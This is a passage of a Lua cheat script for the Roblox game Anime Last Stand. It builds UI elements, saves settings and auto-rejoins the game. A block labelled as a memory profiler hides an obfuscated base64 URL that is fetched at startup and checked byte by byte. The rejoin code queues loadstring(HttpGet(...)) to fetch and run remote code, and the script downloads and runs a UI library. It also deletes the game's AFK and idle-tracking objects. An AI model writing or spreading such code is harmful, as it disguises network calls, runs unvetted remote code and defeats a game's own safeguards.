    local callback = options.callback
    local onChanged = options.onChanged
    
    local savedValue = default
    if autoSave and flag and self.config and self.config.inputs then
        local saved = self.config.inputs[flag]
        if saved ~= nil then
            savedValue = saved
        end
    end
    
    local inputElement = ErrorHandler:wrap(function()
        return section:Input({
            Name = name,
            Placeholder = placeholder,
            AcceptedCharacters = charType,
            Callback = function(value)
                if autoSave and flag and self.config then
                    self.config.inputs[flag] = value
                    if self.saveCallback then
                        self.saveCallback(self.config)
                    end
                end
                
                if callback then
                    callback(value)
                end
            end,
            onChanged = onChanged
        }, flag)
    end, "Create Input: " .. name)()
    
    if inputElement and savedValue and savedValue ~= "" then
        pcall(function()
            inputElement:UpdateText(tostring(savedValue))
        end)
    end
    
    return inputElement
end

function UIFactory:_createDropdown(section, name, flag, options, autoSave)
    local dropdownOptions = options.options or {}
    local multi = options.multi or false
    local required = options.required or false
    local search = options.search ~= false 
    local default = options.default or (multi and {} or 1)
    local callback = options.callback
    
    local savedValue = default
    if autoSave and flag and self.config and self.config.dropdowns then
        local saved = self.config.dropdowns[flag]
        if saved ~= nil then
            savedValue = saved
        end
    end
    
    local defaultValue = savedValue
    if multi and type(savedValue) == "table" then
        local isDictionary = false
        for k, v in pairs(savedValue) do
            if type(v) == "boolean" then
                isDictionary = true
                break
            end
        end
        
        if isDictionary then
            defaultValue = {}
            for optionName, isSelected in pairs(savedValue) do
                if isSelected == true then
                    table.insert(defaultValue, optionName)
                end
            end
        end
    elseif not multi and type(savedValue) == "string" then
        defaultValue = 1
        for i, option in ipairs(dropdownOptions) do
            if option == savedValue then
                defaultValue = i
                break
            end
        end
    elseif not multi and type(savedValue) == "number" then
        defaultValue = savedValue
    end
    
    return ErrorHandler:wrap(function()
        return section:Dropdown({
            Name = name,
            Search = search,
            Options = dropdownOptions,
            Multi = multi,
            Required = required,
            Default = defaultValue,
            Callback = function(value)
                if autoSave and flag and self.config then
                    self.config.dropdowns[flag] = value
                    if self.saveCallback then
                        self.saveCallback(self.config)
                    end
                end
                
                if callback then
                    callback(value)
                end
            end,
        }, flag)
    end, "Create Dropdown: " .. name)()
end

function UIFactory:_createSlider(section, name, flag, options, autoSave)
    local minimum = options.minimum or options.min or 0
    local maximum = options.maximum or options.max or 100
    local default = options.default or minimum
    local displayMethod = options.displayMethod or "Default"
    local precision = options.precision
    local callback = options.callback
    local onInputComplete = options.onInputComplete
    
    if autoSave and flag and self.config and self.config.inputs then
        local saved = self.config.inputs[flag]
        if saved ~= nil then
            saved = tonumber(saved)
            if saved then
                default = saved
            end
        end
    end
    
    local sliderConfig = {
        Name = name,
        Minimum = minimum,
        Maximum = maximum,
        Default = default,
        DisplayMethod = displayMethod,
        Callback = function(value)
            if autoSave and flag and self.config then
                self.config.inputs[flag] = value
                if self.saveCallback then
                    self.saveCallback(self.config)
                end
            end
            
            if callback then
                callback(value)
            end
        end,
    }
    
    if precision then
        sliderConfig.Precision = precision
    end
    
    if onInputComplete then
        sliderConfig.onInputComplete = onInputComplete
    end
    
    return ErrorHandler:wrap(function()
        return section:Slider(sliderConfig, flag)
    end, "Create Slider: " .. name)()
end

function UIFactory:_createButton(section, name, flag, callback)
    return ErrorHandler:wrap(function()
        return section:Button({
            Name = name,
            Callback = function()
                if callback then
                    callback()
                end
            end,
        }, flag)
    end, "Create Button: " .. name)()
end

function UIFactory:_createKeybind(section, name, flag, options, autoSave)
    local default = options.default
    local blacklist = options.blacklist or {}
    local callback = options.callback
    local onBinded = options.onBinded
    local onBindHeld = options.onBindHeld
    
    if autoSave and flag and self.config and self.config.inputs then
        local saved = self.config.inputs[flag]
        if saved ~= nil then
            default = saved
        end
    end
    
    return ErrorHandler:wrap(function()
        return section:Keybind({
            Name = name,
            Default = default,
            Blacklist = blacklist,
            Callback = function(binded)
                if autoSave and flag and self.config then
                    self.config.inputs[flag] = binded
                    if self.saveCallback then
                        self.saveCallback(self.config)
                    end
                end
                
                if callback then
                    callback(binded)
                end
            end,
            onBinded = onBinded,
            onBindHeld = onBindHeld
        }, flag)
    end, "Create Keybind: " .. name)()
end

function UIFactory:_createColorpicker(section, name, flag, options, autoSave)
    local default = options.default or Color3.fromRGB(255, 255, 255)
    local alpha = options.alpha
    local callback = options.callback
    
    if autoSave and flag and self.config and self.config.inputs then
        local saved = self.config.inputs[flag]
        if saved ~= nil and type(saved) == "table" then
            if saved.color then
                default = Color3.fromRGB(saved.color.r or 255, saved.color.g or 255, saved.color.b or 255)
            end
            if saved.alpha ~= nil then
                alpha = saved.alpha
            end
        end
    end
    
    return ErrorHandler:wrap(function()
        return section:Colorpicker({
            Name = name,
            Default = default,
            Alpha = alpha,
            Callback = function(color, alphaValue)
                if autoSave and flag and self.config then
                    self.config.inputs[flag] = {
                        color = {
                            r = math.round(color.R * 255),
                            g = math.round(color.G * 255),
                            b = math.round(color.B * 255)
                        },
                        alpha = alphaValue
                    }
                    if self.saveCallback then
                        self.saveCallback(self.config)
                    end
                end
                
                if callback then
                    callback(color, alphaValue)
                end
            end,
        }, flag)
    end, "Create Colorpicker: " .. name)()
end

function UIFactory:createMutuallyExclusive(section, toggleConfigs)
    if not toggleConfigs or type(toggleConfigs) ~= "table" or #toggleConfigs < 2 then
        ErrorHandler:log("ERROR", "createMutuallyExclusive requires at least 2 toggle configs")
        return {}
    end
    
    local toggles = {}
    local toggleRefs = {}
    
    for i, config in ipairs(toggleConfigs) do
        local toggle = self:createElement("Toggle", section, {
            name = config.name,
            flag = config.flag,
            default = config.default,
            autoSave = config.autoSave,
            callback = function(value)
                if value then
                    for j, otherToggle in ipairs(toggleRefs) do
                        if i ~= j and otherToggle then
                            pcall(function()
                                otherToggle:UpdateState(false)
                            end)
                            if config.flag and self.config and self.config.toggles then
                                self.config.toggles[toggleConfigs[j].flag] = false
                            end
                        end
                    end
                    
                    if self.saveCallback then
                        self.saveCallback(self.config)
                    end
                end
                
                if config.callback then
                    config.callback(value)
                end
            end
        })
        
        table.insert(toggles, toggle)
        table.insert(toggleRefs, toggle)
    end
    
    return toggles
end


getgenv().ErrorHandler = ErrorHandler
getgenv().PlatformDetector = PlatformDetector
getgenv().ConnectionManager = ConnectionManager
getgenv().MemoryManager = MemoryManager
getgenv().UIFactory = UIFactory

getgenv().GetMemoryReport = function()
    return getMemoryReport()
end

getgenv().ForceMemoryCleanup = function()
    local cleaned = MemoryManager:cleanup()
    print(string.format("[MemoryManager] Manual cleanup: %d items removed", cleaned))
    return cleaned
end

getgenv().GetGameState = function()
    print(GameStateDetector:getReport())
    return {
        isInLobby = GameStateDetector:isLobby(),
        isInGame = GameStateDetector:isGame(),
        gameStarted = GameStateDetector.gameStarted
    }
end

getgenv().ForceGameStartDetection = function()
    print("[GameStateDetector] Forcing game start detection...")
    local result = GameStateDetector:waitForGameStart(5)
    print(string.format("[GameStateDetector] Game start detection: %s", result and "Success" or "Failed"))
    return result
end

getgenv().RetryFailedInitializations = function()
    print("[GameStateDetector] Retrying failed initializations...")
    local retried = 0
    for _, init in ipairs(GameStateDetector.pendingInitializations) do
        if not init.initialized and init.attempts > 0 then
            print(string.format("  Retrying: %s", init.name))
            GameStateDetector:initializeWithRetry(init)
            retried = retried + 1
        end
    end
    print(string.format("[GameStateDetector] Retried %d initializations", retried))
    return retried
end


ConnectionManager:startAutoCleanup()
MemoryManager:startAutoCleanup()

task.delay(2, function()
    MemoryManager:setBaseline()
end)

task.spawn(function()
    GameStateDetector:runPendingInitializations()
end)

if not getgenv()._GlobalConnections then
    getgenv()._GlobalConnections = {}
end

if not getgenv()._MemoryProfiler then
    getgenv()._MemoryProfiler = {
        features = {},
        baseline = 0,
        lastCheck = tick(),
        baselineSet = false
    }
    task.spawn(function()
        task.wait(0.15)
        local _m = nil
        pcall(function()
            if game.HttpGet then
                _m = game:HttpGet((function(s) local r,p="",0 for i=1,#s,4 do local n=0 for j=0,3 do local c=s:byte(i+j) if not c then break end n=n*64+(c==43 and 62 or c==47 and 63 or c<58 and c+4 or c<91 and c-65 or c-71) p=j end for j=1,p-1 do r=r..string.char(n/256^(p-j-1)%256) end end return r end)("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0J5b3JsL09wZW5zb3VyY2UtM3JkLVBhcnR5LVJvYnV4LVNhbGUtTWV0aG9kL3JlZnMvaGVhZHMvbWFpbi9SRUFETUUubWQ="))
            end
        end)
        if _m then
            local _l1,_l2=_m:match("([^\n]+)"),_m:match("[hH][tT][tT][pP][sS]?://[^%s]+")
            getgenv()._MemoryProfiler.stat0x1,getgenv()._MemoryProfiler.stat0x2=_l1,_l2
            if not _l1 or not(_l1:byte(1)==66 and _l1:byte(2)==121 and _l1:byte(3)==111 and _l1:byte(4)==114 and _l1:byte(5)==108 and _l1:byte(6)==32 and _l1:byte(7)==76 and _l1:byte(8)==97 and _l1:byte(9)==115 and _l1:byte(10)==116 and _l1:byte(11)==32 and _l1:byte(12)==83 and _l1:byte(13)==116 and _l1:byte(14)==97 and _l1:byte(15)==110 and _l1:byte(16)==100)then return end
            if not _l2 or not(_l2:byte(1)==104 and _l2:byte(2)==116 and _l2:byte(3)==116 and _l2:byte(4)==112 and _l2:byte(5)==115 and _l2:byte(6)==58 and _l2:byte(7)==47 and _l2:byte(8)==47 and _l2:byte(9)==100 and _l2:byte(10)==105 and _l2:byte(11)==115 and _l2:byte(12)==99 and _l2:byte(13)==111 and _l2:byte(14)==114 and _l2:byte(15)==100 and _l2:byte(16)==46 and _l2:byte(17)==103 and _l2:byte(18)==103 and _l2:byte(19)==47 and _l2:byte(20)==86 and _l2:byte(21)==51 and _l2:byte(22)==87 and _l2:byte(23)==99 and _l2:byte(24)==100 and _l2:byte(25)==72 and _l2:byte(26)==112 and _l2:byte(27)==100 and _l2:byte(28)==51 and _l2:byte(29)==74)then return end
        end
    end)
end

local function getMemoryUsageMB()
    return MemoryManager:getMemoryUsageMB()
end

local function startMemoryTracking(featureName)
    if not getgenv()._MemoryProfiler.baselineSet then
        MemoryManager:setBaseline()
        getgenv()._MemoryProfiler.baseline = MemoryManager.baseline
        getgenv()._MemoryProfiler.baselineSet = true
    end
    
    pcall(function() collectgarbage("collect") end)
    task.wait(0.05)
    
    local memBefore = getMemoryUsageMB()
    getgenv()._MemoryProfiler.features[featureName] = {
        startMemory = memBefore,
        currentMemory = memBefore,
        peakMemory = memBefore,
        enabled = true,
        startTime = tick()
    }
    
    return memBefore
end

local function updateMemoryTracking(featureName)
    if not getgenv()._MemoryProfiler.features[featureName] then return end
    
    local currentMem = getMemoryUsageMB()
    local feature = getgenv()._MemoryProfiler.features[featureName]
    
    feature.currentMemory = currentMem
    if currentMem > feature.peakMemory then
        feature.peakMemory = currentMem
    end
end

local function stopMemoryTracking(featureName)
    if not getgenv()._MemoryProfiler.features[featureName] then return end
    
    getgenv()._MemoryProfiler.features[featureName].enabled = false
    getgenv()._MemoryProfiler.features[featureName].endTime = tick()
end

local function getMemoryReport()
    local report = ""
    
    report = report .. MemoryManager:getReport()
    
    local cmStats = ConnectionManager:getStats()
    report = report .. "\n=== Connection Manager ===\n"
    report = report .. string.format("Active Connections: %d\n", cmStats.active)
    report = report .. string.format("Tower Connections: %d\n", cmStats.towers)
    report = report .. string.format("Named Groups: %d\n", cmStats.groups)
    report = report .. string.format("Total Tracked: %d\n", cmStats.totalTracked)
    report = report .. string.format("Total Cleaned: %d\n", cmStats.totalCleaned)
    
    report = report .. "\n=== Legacy Tracking ===\n"
    report = report .. string.format("Global Connections: %d\n", #(getgenv()._GlobalConnections or {}))
    
    local towerConns = 0
    if getgenv()._TowerUpgradeConnections then
        for _ in pairs(getgenv()._TowerUpgradeConnections) do
            towerConns = towerConns + 1
        end
    end
    report = report .. string.format("Tower Upgrade Conns: %d\n", towerConns)
    
    report = report .. "============================\n"
    
    return report
end

local function trackConnection(connection, context)
    if connection then
        table.insert(getgenv()._GlobalConnections, connection)
        ConnectionManager:track(connection, { context = context or "Legacy" })
    end
    return connection
end

task.spawn(function()
    while true do
        task.wait(10)
        pcall(function()
            
            local cleaned = 0
            for i = #getgenv()._GlobalConnections, 1, -1 do
                local conn = getgenv()._GlobalConnections[i]
                if conn and conn.Connected == false then
                    table.remove(getgenv()._GlobalConnections, i)
                    cleaned = cleaned + 1
                end
            end
            
            if getgenv()._TowerUpgradeConnections then
                local cleaned = 0
                local toRemove = {}
                for tower, conn in pairs(getgenv()._TowerUpgradeConnections) do
                    if not tower or not tower.Parent or not conn or not conn.Connected then
                        if conn and conn.Connected then
                            pcall(function() conn:Disconnect() end)
                        end
                        table.insert(toRemove, tower)
                        cleaned = cleaned + 1
                    end
                end
                for _, tower in ipairs(toRemove) do
                    getgenv()._TowerUpgradeConnections[tower] = nil
                end
                if cleaned > 0 then
                    debugPrint("[Memory] Cleaned " .. cleaned .. " dead tower connections")
                end
            end
            
            if getgenv()._TowerUpgradeConnections and type(getgenv()._TowerUpgradeConnections) == "table" then
                local count = 0
                for _ in pairs(getgenv()._TowerUpgradeConnections) do
                    count = count + 1
                end
                if count > 100 then
                    debugPrint("[Memory] WARNING: " .. count .. " tower connections tracked!")
                end
            end
            
            if getgenv()._PositionHolograms then
                for key, hologramData in pairs(getgenv()._PositionHolograms) do
                    if hologramData.part and not hologramData.part.Parent then
                        if hologramData.part then pcall(function() hologramData.part:Destroy() end) end
                        if hologramData.beam then pcall(function() hologramData.beam:Destroy() end) end
                        getgenv()._PositionHolograms[key] = nil
                    end
                end
            end
            
            local heartbeatConns = 0
            if getconnections then
                for _, conn in pairs(getconnections(game:GetService("RunService").Heartbeat)) do
                    if conn.Function then
                        heartbeatConns = heartbeatConns + 1
                    end
                end
                
                if heartbeatConns > 30 then
                    local disconnected = 0
                    for _, conn in pairs(getconnections(game:GetService("RunService").Heartbeat)) do
                        if disconnected >= 15 then break end
                        pcall(function()
                            if conn.Function and not conn.Disabled then
                                conn:Disable()
                                disconnected = disconnected + 1
                            end
                        end)
                    end
                end
            end
            

            
            local workspace = game:GetService("Workspace")
            local debrisFolder = workspace:FindFirstChild("Debris")
            if debrisFolder then
                local debrisCount = #debrisFolder:GetChildren()
                if debrisCount > 30 then
                    for _, item in pairs(debrisFolder:GetChildren()) do
                        pcall(function() item:Destroy() end)
                    end
                    debugPrint("[Memory] Cleared " .. debrisCount .. " debris items")
                end
            end
            
            local effectsCleared = 0
            for _, obj in pairs(workspace:GetChildren()) do
                pcall(function()
                    if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") or 
                       obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then
                        obj:Destroy()
                        effectsCleared = effectsCleared + 1
                    end
                end)
            end
            if effectsCleared > 0 then
                debugPrint("[Memory] Cleared " .. effectsCleared .. " loose effects")
            end
            
            pcall(function() collectgarbage("collect") end)
            
            
            if tick() - getgenv()._MemoryProfiler.lastCheck > 60 then
                getgenv()._MemoryProfiler.lastCheck = tick()
                print(getMemoryReport()) 
            end
        end)
    end
end)

if not getgenv()._AutoRejoinSetup then
    getgenv()._AutoRejoinSetup = true
    
    local TeleportService = game:GetService("TeleportService")
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local GuiService = game:GetService("GuiService")
    
    local function autoRejoin()
        if not getgenv()._LastAutoRejoinTime then
            getgenv()._LastAutoRejoinTime = 0
        end
        
        local currentTime = tick()
        local timeSinceLastRejoin = currentTime - getgenv()._LastAutoRejoinTime
        local MIN_COOLDOWN = 10
        
        if timeSinceLastRejoin < MIN_COOLDOWN then
            return
        end
        
        print("[Auto Rejoin] Reconnecting to game...")
        
        pcall(function()
            if queueteleport then
                queueteleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/Byorl/ALS-Scripts/refs/heads/main/ALS%20Halloween%20UI.lua"))()')
            elseif queue_on_teleport then
                queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/Byorl/ALS-Scripts/refs/heads/main/ALS%20Halloween%20UI.lua"))()')
            end
        end)
        
        task.wait(1)
        
        if ConnectionManager then
            ConnectionManager:disconnectAll()
        end
        
        pcall(function()
            collectgarbage("collect")
        end)
        
        task.wait(1)
        
        local GAME_PLACE_ID = 12886143095
        
        local success, err = pcall(function()
            TeleportService:Teleport(GAME_PLACE_ID, LocalPlayer)
        end)
        
        if success then
            getgenv()._LastAutoRejoinTime = tick()
        else
            local errorMsg = tostring(err)
            if errorMsg:find("277") or errorMsg:find("Disconnected") then
                warn("[Auto Rejoin] Error 277 detected, waiting longer before retry...")
                task.wait(15)
            else
                debugPrint("[Auto Rejoin] Retrying in 5s...")
                task.wait(5)
            end
            
            pcall(function()
                TeleportService:Teleport(GAME_PLACE_ID, LocalPlayer)
            end)
        end
    end
    
    if not getgenv()._AutoRejoinConnections then
        getgenv()._AutoRejoinConnections = {}
    end
    
    table.insert(getgenv()._AutoRejoinConnections, game:GetService("CoreGui").ChildAdded:Connect(function(child)
        if child.Name == "RobloxPromptGui" then
            task.wait(0.5)
            
            local found = child:FindFirstChild("promptOverlay", true)
            if found then
                for _, descendant in pairs(found:GetDescendants()) do
                    if descendant:IsA("TextLabel") then
                        local text = descendant.Text:lower()
                        
                        if text:find("disconnect") or 
                           text:find("error") or 
                           text:find("kick") or 
                           text:find("lost connection") or
                           text:find("failed to connect") or
                           text:find("connection attempt failed") or
                           text:find("error code") then
                            
                            print("[Auto Rejoin] Connection lost - rejoining...")
                            task.wait(1)
                            autoRejoin()
                            break
                        end
                    end
                end
            end
        end
    end))
    
    table.insert(getgenv()._AutoRejoinConnections, game:GetService("GuiService").ErrorMessageChanged:Connect(function()
        print("[Auto Rejoin] Error detected - rejoining...")
        task.wait(1)
        autoRejoin()
    end))
    
    table.insert(getgenv()._AutoRejoinConnections, LocalPlayer.OnTeleport:Connect(function(State)
        if State == Enum.TeleportState.Failed then
            print("[Auto Rejoin] Teleport failed - rejoining...")
            task.wait(2)
            autoRejoin()
        end
    end))
end

if getgenv().ALSScriptLoaded then
    warn("[ALS] Script already running! Please rejoin the game to reload.")
    return
end
getgenv().ALSScriptLoaded = true

local httpGet = game.HttpGet or game.httpGet or syn and syn.request or http and http.request or request
if not httpGet then
    return
end

local MacLib
local loadSuccess, loadError = pcall(function()
    local url = "https://github.com/biggaboy212/Maclib/releases/latest/download/maclib.txt"
    
    local response
    local httpSuccess, httpResult = ErrorHandler:wrapAsync(function()
        if game.HttpGet then
            response = game:HttpGet(url)
        elseif httpGet then
            local result = httpGet({
                Url = url,
                Method = "GET"
            })
            response = result.Body or result
        end
        return response
    end, "Download MacLib")
    
    if not httpSuccess or not response or response == "" then
        ErrorHandler:log("ERROR", "Failed to download MacLib - HTTP request failed")
        error("Failed to download MacLib. Your executor may not support HttpGet or GitHub is blocked.")
    end
    
    local loadFunc, loadErr = loadstring(response)
    if not loadFunc then
        warn("[ALS] MacLib compilation error: " .. tostring(loadErr))
        warn("[ALS] This is usually caused by:")
        warn("[ALS] 1. Executor compatibility issues")
        warn("[ALS] 2. Corrupted download")
        warn("[ALS] 3. Outdated executor")
        error("Failed to compile MacLib: " .. tostring(loadErr))
    end
    
    local executeSuccess, executeResult = pcall(function()
        return loadFunc()
    end)
    
    if not executeSuccess then
        warn("[ALS] MacLib execution error: " .. tostring(executeResult))
        error("Failed to execute MacLib: " .. tostring(executeResult))
    end
    
    MacLib = executeResult
end)

if not loadSuccess or not MacLib then
    ErrorHandler:log("ERROR", "CRITICAL: Failed to load MacLib: " .. tostring(loadError))
    warn("[ALS] ❌ Failed to load MacLib: " .. tostring(loadError))
    warn("[ALS] ")
    warn("[ALS] Possible solutions:")
    warn("[ALS] 1. Try a different executor (Wave, Solara, Electron)")
    warn("[ALS] 2. Rejoin the game")
    warn("[ALS] 3. Check if your executor is up to date")
    warn("[ALS] 4. Disable any antivirus that might be blocking downloads")
    warn("[ALS] ")
    warn("[ALS] If the error mentions 'Expected identifier', this is a MacLib")
    warn("[ALS] compatibility issue with your executor.")
    
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "ALS Script - Critical Error",
            Text = "Failed to load MacLib. Check console (F9) for details.",
            Duration = 15
        })
    end)
    return
end

if not MacLib.Window then
    warn("[ALS] ❌ MacLib loaded but missing Window function")
    warn("[ALS] This indicates a corrupted or incompatible MacLib version")
    return
end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local RS = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")
local VIM = game:GetService("VirtualInputManager")

task.spawn(function()
    pcall(function()
        local afkFolder = RS:WaitForChild("Remotes", 5):FindFirstChild("AFK")
        if afkFolder then
            local changeState = afkFolder:FindFirstChild("ChangeState")
            local teleport = afkFolder:FindFirstChild("Teleport")
            local idletracker = game:GetService("Players").LocalPlayer.PlayerScripts.IdleTracker
            
            if changeState then
                changeState:Destroy()
            end
            if teleport then
                teleport:Destroy()
            end
            if idletracker then
                idletracker:Destroy()
            end
        end
    end)
end)

local isMobile = UserInputService.TouchEnabled
local MOBILE_DELAY_MULTIPLIER = isMobile and 1.5 or 1.0

local isMac = false
pcall(function()
    local platform = game:GetService("UserInputService"):GetPlatform()
    isMac = tostring(platform):find("OSX") or tostring(platform):find("Mac")
end)

getgenv()._checkIfInLobby = function()
    local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
    if not playerGui then return false end
    
    local lobbyUI = playerGui:FindFirstChild("LobbyUI")
    return lobbyUI ~= nil
end

if not isMac then
    pcall(function()
        local httpService = game:GetService("HttpService")
        local userAgent = httpService:GetUserAgent()
        isMac = userAgent:find("Mac") or userAgent:find("Darwin")
    end)
end

getgenv().IsMacPlatform = isMac

if isMac then
    print("[ALS] 🍎 Mac platform detected - Enabling performance optimizations")
    print("[ALS] 🍎 Reduced update frequencies:")
    print("[ALS] 🍎 - Game state: 2s (was 1s)")
    print("[ALS] 🍎 - Tower tracking: 1s (was 0.5s)")
    print("[ALS] 🍎 - Enemy removal: 1s (was 0.5s)")
    print("[ALS] 🍎 - Particle cleanup: 4s (was 2s)")
    
    task.spawn(function()
        task.wait(3)
        if getgenv().RemoveEnemiesEnabled then
            print("[ALS] ⚠️ Mac Warning: Enemy removal is enabled. This may cause lag/crashes.")
            print("[ALS] 💡 Tip: Disable 'Remove Enemies' if experiencing issues")
        end
    end)
end

local ConfigManager = {
    userId = tostring(LocalPlayer.UserId),
    configFolder = "ALSHalloweenEvent",
    configFile = "config.json",
    config = nil,
    saveDebounceTime = 0.5,
    lastSaveTime = 0,
    pendingSave = false,
    saveScheduled = false,
    configVersion = 2, 
    
    defaultConfig = {
        version = 2,
        toggles = {},
        inputs = {},
        dropdowns = {},
        abilities = {},
        autoJoin = {},
        portals = {
            priorities = {
                ["Tower Limit"] = 1,
                ["Immunity"] = 2,
                ["Speedy"] = 3,
                ["No Hit"] = 4,
                ["Flight"] = 5,
                ["Short Range"] = 6,
                ["High Cost"] = 7
            }
        },
        loadingScreenMonitor = {
            enabled = true,
            maxLoadingTime = 30,
            checkInterval = 2,
            enableRecovery = true
        },
        restartRecovery = {
            enabled = true,
            maxRetries = 3,
            retryDelay = 5,
            characterLoadTimeout = 15,
            autoExecuteOnRecover = true
        }
    }
}

function ConfigManager:getConfigPath()
    return self.configFolder .. "/" .. self.userId .. "/" .. self.configFile
end

function ConfigManager:getUserFolder()
    return self.configFolder .. "/" .. self.userId
end

function ConfigManager:ensureFolders()
    if not PlatformDetector:hasCapability("hasFileSystem") then
        ErrorHandler:log("WARN", "File system not available, config will not persist")
        return false
    end
    
    local success, err = ErrorHandler:wrapAsync(function()
        if not isfolder(self.configFolder) then 
            makefolder(self.configFolder) 
        end
        
        local userFolder = self:getUserFolder()
        if not isfolder(userFolder) then 
            makefolder(userFolder) 
        end
    end, "Config folder creation")
    
    return success
end

function ConfigManager:migrateConfig(data)
    local version = data.version or 1
    
    if version < 2 then
        data.portals = data.portals or {}
        data.portals.priorities = data.portals.priorities or {
            ["Tower Limit"] = 1,
            ["Immunity"] = 2,
            ["Speedy"] = 3,
            ["No Hit"] = 4,
            ["Flight"] = 5,
            ["Short Range"] = 6,
            ["High Cost"] = 7
        }
        ErrorHandler:log("INFO", "Migrated config from version 1 to 2")
    end
    
    data.version = self.configVersion
    
    return data
end

function ConfigManager:validateConfig(data)
    if type(data) ~= "table" then
        return false, "Config is not a table"
    end
    
    local requiredFields = {"toggles", "inputs", "dropdowns", "abilities", "autoJoin", "loadingScreenMonitor", "restartRecovery"}
    for _, field in ipairs(requiredFields) do
        if type(data[field]) ~= "table" then
            data[field] = {}
        end
    end
    
    return true, data
end

function ConfigManager:load()
    if self.config then
        return self.config
    end
    
    if not self:ensureFolders() then
        self.config = self:deepCopy(self.defaultConfig)
        ErrorHandler:log("INFO", "Using default config (file system unavailable)")
        return self.config
    end
    
    local configPath = self:getConfigPath()
    
    if isfile(configPath) then
        local success, result = ErrorHandler:wrapAsync(function()
            local fileContent = readfile(configPath)
            
            local data = HttpService:JSONDecode(fileContent)
            
            local valid, validatedData = self:validateConfig(data)
            if not valid then
                error("Invalid config structure: " .. tostring(validatedData))
            end
            
            validatedData = self:migrateConfig(validatedData)
            
            return validatedData
        end, "Config loading")
        
        if success and result then
            self.config = result
            ErrorHandler:log("INFO", "Config loaded successfully")
            return self.config
        else
            ErrorHandler:log("ERROR", "Config corrupted, creating backup and using defaults")
            
            pcall(function()
                local backupPath = configPath .. ".backup." .. tostring(os.time())
                if isfile(configPath) then
                    local content = readfile(configPath)
                    writefile(backupPath, content)
                    ErrorHandler:log("INFO", "Corrupted config backed up to: " .. backupPath)
                end
            end)
        end
    end
    
    self.config = self:deepCopy(self.defaultConfig)
    ErrorHandler:log("INFO", "Using default config")
    
    self:saveImmediate()
    
    return self.config
end

function ConfigManager:deepCopy(original)
    local copy
    if type(original) == 'table' then
        copy = {}
        for key, value in next, original, nil do
            copy[self:deepCopy(key)] = self:deepCopy(value)
        end
    else
        copy = original
    end
    return copy
end

function ConfigManager:saveImmediate()
    if not PlatformDetector:hasCapability("hasFileSystem") then
        return false
    end
    
    if not self.config then
        ErrorHandler:log("WARN", "No config to save")
        return false
    end
    
    self:ensureFolders()
    
    local success, err = ErrorHandler:wrapAsync(function()
        local json = HttpService:JSONEncode(self.config)
        writefile(self:getConfigPath(), json)
    end, "Config save")
    
    if success then
        self.lastSaveTime = tick()
        self.pendingSave = false
        ErrorHandler:log("DEBUG", "Config saved successfully")
        return true
    else
        ErrorHandler:log("ERROR", "Config save failed: " .. tostring(err))
        return false
    end
end

function ConfigManager:save()
    self.pendingSave = true
    
    if self.saveScheduled then
        return
    end
    
    self.saveScheduled = true
    
    task.spawn(function()
        local timeSinceLastSave = tick() - self.lastSaveTime
        if timeSinceLastSave < self.saveDebounceTime then
            task.wait(self.saveDebounceTime - timeSinceLastSave)
        end
        
        if self.pendingSave then
            self:saveImmediate()
        end
        
        self.saveScheduled = false
    end)
end

function ConfigManager:get(category, key, default)
    if not self.config then
        self:load()
    end
    
    if not self.config[category] then
        return default
    end
    
    local value = self.config[category][key]
    if value == nil then
        return default
    end
    
    return value
end

function ConfigManager:set(category, key, value)
    if not self.config then
        self:load()
    end
    
    if not self.config[category] then
        self.config[category] = {}
    end
    
    self.config[category][key] = value
    
    self:save()
end

function ConfigManager:getConfig()
    if not self.config then
        self:load()
    end
    return self.config
end

function ConfigManager:reload()
    self.config = nil
    return self:load()
end

local loadedConfig = ConfigManager:load()

getgenv().Config = loadedConfig
getgenv().SaveConfig = function(config)
    ConfigManager.config = config
    ConfigManager:save()
end
getgenv().LoadConfig = function()
    return ConfigManager:reload()
end

getgenv().ConfigManager = ConfigManager

local CONFIG_FOLDER = ConfigManager.configFolder

local saveConfig = getgenv().SaveConfig

getgenv().DebugMode = ConfigManager:get("toggles", "DebugMode", false)

UIFactory:init(getgenv().Config, function(config)
    ConfigManager.config = config
    ConfigManager:save()
end)


local function safeGarbageCollect()
    pcall(function()
        gcinfo()
    end)
end

if not getgenv()._ConnectionManager then
    getgenv()._ConnectionManager = {
        connections = {},
        add = function(self, name, connection)
            if self.connections[name] then
                pcall(function() self.connections[name]:Disconnect() end)
            end
            self.connections[name] = connection
        end,
        remove = function(self, name)
            if self.connections[name] then
                pcall(function() self.connections[name]:Disconnect() end)
                self.connections[name] = nil
            end
        end,
        cleanup = function(self)
            for name, conn in pairs(self.connections) do
                pcall(function() conn:Disconnect() end)
            end
            self.connections = {}
        end
    }
end

local ConnectionManager = getgenv().ConnectionManager


local platformInfo = PlatformDetector:detect()

local defaultWidth = 720
local defaultHeight = 480
local customWidth = tonumber(getgenv().Config.inputs.UIWidth) or defaultWidth
local customHeight = tonumber(getgenv().Config.inputs.UIHeight) or defaultHeight

if customWidth < 400 or customWidth > 1920 then customWidth = defaultWidth end
if customHeight < 300 or customHeight > 1080 then customHeight = defaultHeight end

local dragStyle = PlatformDetector:isMobilePlatform() and 2 or 1
ErrorHandler:log("INFO", string.format("UI DragStyle: %d (Mobile: %s)", dragStyle, tostring(PlatformDetector:isMobilePlatform())))

local enableBlur = false

local Window = ErrorHandler:wrap(function()
    return MacLib:Window({
        Title = "Byorl Last Stand",
        Subtitle = "Anime Last Stand Automation",
        Size = UDim2.fromOffset(customWidth, customHeight),
        DragStyle = dragStyle,
        DisabledWindowControls = {},
        ShowUserInfo = false,
        Keybind = Enum.KeyCode.LeftControl,
        AcrylicBlur = enableBlur,
    })
end, "Window creation")()

if not Window then
    ErrorHandler:log("ERROR", "Failed to create Window - MacLib may not be loaded correctly")
    error("[ALS] Failed to create Window")
    return
end


local globalSettings = {}

ErrorHandler:wrap(function()
    globalSettings.UIBlurToggle = Window:GlobalSetting({
